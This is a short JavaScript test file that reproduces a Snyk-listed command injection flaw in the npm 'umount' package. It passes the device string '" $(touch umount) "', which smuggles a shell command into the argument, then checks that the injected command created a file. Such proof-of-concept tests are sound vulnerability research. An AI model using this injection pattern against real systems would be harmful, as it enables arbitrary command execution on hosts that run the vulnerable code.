//https://snyk.io/vuln/SNYK-JS-UMOUNT-564265
test("Command Injection in umount", () => {
  const root = require("umount");
  const fs = require("fs");
  const path = "./umount";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let device = '" $(touch umount) "';
  root.umount(device, function () {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
